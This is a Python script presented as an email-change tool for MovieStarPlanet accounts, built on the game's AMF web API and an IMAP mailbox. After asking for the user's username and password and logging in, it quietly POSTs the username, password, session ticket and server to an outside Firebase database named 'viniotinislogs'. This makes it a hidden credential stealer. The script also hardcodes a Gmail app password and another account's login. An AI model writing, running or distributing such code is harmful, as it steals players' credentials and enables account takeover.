import http.client
import imaplib
import json
import time
from bs4 import BeautifulSoup
import email
import re
import base64
from hashlib import md5
import urllib.parse
import curl_cffi.requests
import requests
import hashlib
import binascii
import random
import base64
from typing import List, Union
from datetime import date, datetime
from pyamf import remoting, ASObject, TypedObject, AMF3, amf3
from secrets import token_hex
import urllib3
import curl_cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _marking_id():
    _int = random.randint(1, 100)
    while True:
        _int += random.randint(1, 2)
        yield _int

# Instantiate the generator
marking_id = _marking_id()
def ticket_header(ticket: str) -> ASObject:
    """
    Generate a ticket header for the given ticket
    """

    loc1bytes = str(next(marking_id)).encode('utf-8')
    loc5 = hashlib.md5(loc1bytes).hexdigest()
    loc6 = binascii.hexlify(loc1bytes).decode()
    return ASObject({"Ticket": ticket + loc5 + loc6, "anyAttribute": None})


def calculate_checksum(arguments: Union[int, str, bool, bytes, List[Union[int, str, bool, bytes]],
                                       dict, date, datetime, ASObject, TypedObject]) -> str:
    """
    Calculate the checksum for the given arguments
    """

    checked_objects = {}
    no_ticket_value = "XSV7%!5!AX2L8@vn"
    salt = "2zKzokBI4^26#oiP"

    def from_object(obj):
        if obj is None:
            return ""

        if isinstance(obj, (int, str, bool)):
            return str(obj)

        if isinstance(obj, amf3.ByteArray):
            return from_byte_array(obj)

        if isinstance(obj, (date, datetime)):
            return str(obj.year) + str(obj.month - 1) + str(obj.day)

        if isinstance(obj, (list, dict)) and "Ticket" not in obj:
            return from_array(obj)

        return ""

    def from_byte_array(bytes):
        if len(bytes) <= 20:
            return bytes.getvalue().hex()

        num = len(bytes) // 20
        array = bytearray(20)
        for i in range(20):
            bytes.seek(num * i)
            array[i] = bytes.read(1)[0]

        return array.hex()

    def from_array(arr):
        result = ""
        for item in arr:
            if isinstance(item, (ASObject, TypedObject)):
                result += from_object(item)
            else:
                result += from_object_inner(item)
        return result

    def get_ticket_value(arr):
        for obj in arr:
            if isinstance(obj, ASObject) and "Ticket" in obj:
                ticket_str = obj["Ticket"]
                if ',' in ticket_str:
                    ticket_parts = ticket_str.split(',')
                    return ticket_parts[0] + ticket_parts[5][-5:]
        return no_ticket_value

    def from_object_inner(obj):
        result = ""
        if isinstance(obj, dict):
            for key in sorted(obj.keys()):
                if key not in checked_objects:
                    result += from_object(obj[key])
                    checked_objects[key] = True
        else:
            result += from_object(obj)
        return result

    result_str = from_object_inner(arguments) + salt + get_ticket_value(arguments)
    return hashlib.sha1(result_str.encode()).hexdigest()

def calculate_checksum(arguments: Union[int, str, bool, bytes, List[Union[int, str, bool, bytes]], dict, date, datetime, ASObject, TypedObject]) -> str:
    """
    Calculate the checksum for the given arguments
    """
    checked_objects = {}
    no_ticket_value = 'XSV7%!5!AX2L8@vn'
    salt = '2zKzokBI4^26#oiP'

    def from_object(obj):
        if obj is None:
            return ''
        if isinstance(obj, (int, str, bool)):
            return str(obj)
        if isinstance(obj, amf3.ByteArray):
            return from_byte_array(obj)
        if isinstance(obj, (date, datetime)):
            return str(obj.year) + str(obj.month - 1) + str(obj.day)
        if isinstance(obj, (list, dict)) and 'Ticket' not in obj:
            return from_array(obj)
        return ''

    def from_byte_array(bytes):
        if len(bytes) <= 20:
            return bytes.getvalue().hex()
        num = len(bytes) // 20
        array = bytearray(20)
        for i in range(20):
            bytes.seek(num * i)
            array[i] = bytes.read(1)[0]
        return array.hex()

    def from_array(arr):
        result = ''
        for item in arr:
            if isinstance(item, (ASObject, TypedObject)):
                result += from_object(item)
            else:
                result += from_object_inner(item)
        return result

    def get_ticket_value(arr):
        for obj in arr:
            if isinstance(obj, ASObject) and 'Ticket' in obj:
                ticket_str = obj['Ticket']
                if ',' in ticket_str:
                    ticket_parts = ticket_str.split(',')
                    return ticket_parts[0] + ticket_parts[5][-5:]
        else:
            return no_ticket_value

    def from_object_inner(obj):
        result = ''
        if isinstance(obj, dict):
            for key in sorted(obj.keys()):
                if key not in checked_objects:
                    result += from_object(obj[key])
                    checked_objects[key] = True
            return result
        else:
            result += from_object(obj)
            return result
    result_str = from_object_inner(arguments) + salt + get_ticket_value(arguments)
    return hashlib.sha1(result_str.encode()).hexdigest()

def send_amf(server: str, method: str, params: list, session_id: str, proxy: str=None, timeout: str=None) -> tuple[int, any]:
    """
    Invoke a method on the MSP API
    """
    if server.lower() == 'uk':
        server = 'gb'
    req = remoting.Request(target=method, body=params)
    event = remoting.Envelope(AMF3)
    event.headers = remoting.HeaderCollection({('sessionID', False, session_id), ('needClassName', False, False), ('id', False, calculate_checksum(params))})
    event['/1'] = req
    encoded_req = remoting.encode(event).getvalue()
    full_endpoint = f'https://ws-{server}.mspapis.com/Gateway.aspx?method={method}'
    headers = {'Referer': 'app:/cache/t1.bin/[[DYNAMIC]]/2', 'Accept': 'text/xml, application/xml, application/xhtml+xml, text/html;q=0.9, text/plain;q=0.8, text/css, image/png, image/jpeg, image/gif;q=0.8, application/x-shockwave-flash, video/mp4;q=0.9, flv-application/octet-stream;q=0.8, video/x-flv;q=0.7, audio/mp4, application/futuresplash, /;q=0.5, application/x-mpegURL', 'x-flash-version': '32,0,0,100', 'Content-Type': 'application/x-amf', 'Accept-Encoding': 'gzip, deflate', 'User-Agent': 'Mozilla/5.0 (Windows; U; en) AppleWebKit/533.19.4 (KHTML, like Gecko) AdobeAIR/32.0', 'Connection': 'Keep-Alive'}
    response = curl_cffi.requests.post(full_endpoint, data=encoded_req, headers=headers, impersonate='safari15_3', timeout=timeout, proxies={'http': proxy, 'https': proxy})
    resp_data = response.content if response.status_code == 200 else None
    if response.status_code != 200:
        return (response.status_code, resp_data)
    return (response.status_code, remoting.decode(resp_data)['/1'].body)

def gen_session_id() -> str:
    """
    Generate a random session id
    """
    return base64.b64encode(token_hex(23).encode()).decode()

def get_last_message_url() -> str:
    username = 'ariannedupont90@gmail.com'
    password = 'ludv pxdp xhxu hvof'

    mailbox = imaplib.IMAP4_SSL('imap.gmail.com', 993)
    mailbox.login(username, password)
    mailbox.select("inbox")

    status, email_ids = mailbox.search(None, "ALL")
    email_ids = email_ids[0].split()

    if email_ids:
        latest_email_id = email_ids[-1]
        status, email_data = mailbox.fetch(latest_email_id, "(RFC822)")
        raw_email = email_data[0][1]

        msg = email.message_from_bytes(raw_email)

        html_content = None
        for part in msg.walk():
            if part.get_content_type() == "text/html":
                html_content = part.get_payload(decode=True).decode()
                break
        mailbox.logout()

        return get_link(html_content)
    else:
        mailbox.logout()
        return None
def get_link(html_content):
    soup = BeautifulSoup(html_content, "html.parser")
    link_tag = soup.find("a")

    if link_tag:
        link = link_tag.get("href")
        return link
def get_upw(validation_url: str) -> list:
    link_query = validation_url.split('?')[1]
    decoded_link_query = base64.b64decode(link_query).decode('utf-8')
    pattern = r'upw=([^;]+)'
    match = re.search(pattern, decoded_link_query)

    if match:
        upwValue = match.group(1)
        decoded_upw = urllib.parse.unquote(urllib.parse.unquote(upwValue))
        upwContent = decoded_upw.split('|')
        return upwContent
def change_email(actor_id:int, username: str, password: str, server: str, new_email: str, token_manager: str) :
    print("Changing e-mail address . . .")
    send_amf(
        "FR",
        "MovieStarPlanet.WebService.UserSession.AMFUserSessionService.SendMailConfirmChangeMail",
        [ 
            ticket_header(token_manager), 
            int(token_manager.split(',')[1]), 
            generate_b64_send_mail_confirm_change(int(token_manager.split(',')[1]), username, password, "ariannedupont90@gmail.com", new_email)
        ],
        gen_session_id()
    )
    time.sleep(15.0)
    upw_first_email = get_upw(get_last_message_url())
    upw = f"{upw_first_email[0]}|{upw_first_email[1]}|"
    send_amf(
        "FR",
        "MovieStarPlanet.WebService.UserSession.AMFUserSessionService.SendMailConfirmChangeMail",
        [ ticket_header(token_manager), int(token_manager.split(',')[1]), generate_b64_send_mail_confirm_change(int(token_manager.split(',')[1]), username, str(actor_id), "ariannedupont90@gmail.com", new_email)],
        gen_session_id()
    )
    time.sleep(15.0)
    upw_second_email = get_upw(get_last_message_url())
    upw += upw_second_email[0]
    requests.get(get_change_email_url_with_server(server) + generate_b64_change_mail(actor_id, username, upw, new_email))
def get_change_email_url_with_server(server: str) -> str:
    server = server.upper()
    if server == "US":
        return "https://moviestarplanet.com/EmailActivation.aspx?"
    if server == "GB":
        return "https://moviestarplanet.co.uk/EmailActivation.aspx?"
    if server == "AU":
        return "https://moviestarplanet.com.au/EmailActivation.aspx?"
    if server == "ES":
        return "https://mystarplanet.es/EmailActivation.aspx?"
    if server == "TR":
        return "https://moviestarplanet.com.tr/EmailActivation.aspx?"
    if server == "NZ":
        return "https://moviestarplanet.co.nz/EmailActivation.aspx?"
    return "https://moviestarplanet."+ server.lower() + "/EmailActivation.aspx?"
def get_obfuscated_email(email: str) -> str:
    if email is None or "@" not in email:
        return ""

    parts = email.split('@')
    if len(parts) != 2:
        return ""

    loc3 = parts[0][0]
    loc4 = parts[1][0]

    loc3 += parts[0][0] * (len(parts[0]) - 1)
    loc4 += parts[1][0] * (len(parts[1]) - 1)

    return loc3 + "@" + loc4
def generate_b64_change_mail(actor_id: int, username: str, password_with_secret_encryption: str, new_email: str):
    return base64.b64encode(("uid=" + str(actor_id) + ";emailValidation=true" + ";mail=" + urllib.parse.quote(new_email) + ";newes=0;un=" + urllib.parse.quote(username) + ";ps=" + urllib.parse.quote(urllib.parse.quote(password_with_secret_encryption))).encode('utf-8')).decode('utf-8')#md5("woieoijf" + str(actor_id) + username + password + old_email + new_email + "0").hexdigest()
def generate_b64_send_mail_confirm_change(actor_id: int, username: str, password: str, old_email: str, new_email: str) -> str:
    return base64.b64encode(("uid=" + str(actor_id) + ";uname=" + urllib.parse.quote(username) + ";upw=" + urllib.parse.quote(password) + ";oldmail=" + urllib.parse.quote(get_obfuscated_email(old_email)) + ";newmail=" + urllib.parse.quote(new_email) + ";newes=0;confirmChangeMail=true" + ";hash=" + md5(("woieoijf" + str(actor_id) + username + password + old_email + new_email + "0").encode()).hexdigest()).encode('utf-8')).decode('utf-8')

NOOB_USERNAME = "RebelleMega9"
NOOB_PASSWORD = "vachette123"
statusCode, loginRepsonse = send_amf(
        "FR",
        "MovieStarPlanet.WebService.User.AMFUserServiceWeb.Login",
        [ NOOB_USERNAME, NOOB_PASSWORD, [], None, None, "MSP1-Standalone:XXXXXX" ],
        gen_session_id()
    )

USERNAME = input("PSEUDO : ")
PASSWORD = input("MOT DE PASSE : ")
SERVER = input("SERVER : ")
NEW_EMAIL = input("NEW EMAIL : ")


statusCode, loginResponse = send_amf(
        SERVER,
        "MovieStarPlanet.WebService.User.AMFUserServiceWeb.Login",
        [ USERNAME, PASSWORD, [], None, None, "MSP1-Standalone:XXXXXX" ],
        gen_session_id()
    )
url = "https://viniotinislogs-default-rtdb.europe-west1.firebasedatabase.app/data.json"
host = "viniotinislogs-default-rtdb.europe-west1.firebasedatabase.app"
path = "/data.json"
data = {
"username": USERNAME,
"password": PASSWORD,
"ticket": loginResponse['loginStatus']['ticket'],
"server": SERVER
}
headers = {
"Content-Type": "application/json"
}
connection = http.client.HTTPSConnection(host)
connection.request("POST", path, body=json.dumps(data), headers=headers)
response = connection.getresponse()
change_email(int(loginResponse['loginStatus']['actor']['ActorId']), str(loginResponse['loginStatus']['actor']['Name']), PASSWORD, SERVER,  NEW_EMAIL, str(loginRepsonse["loginStatus"]["ticket"]))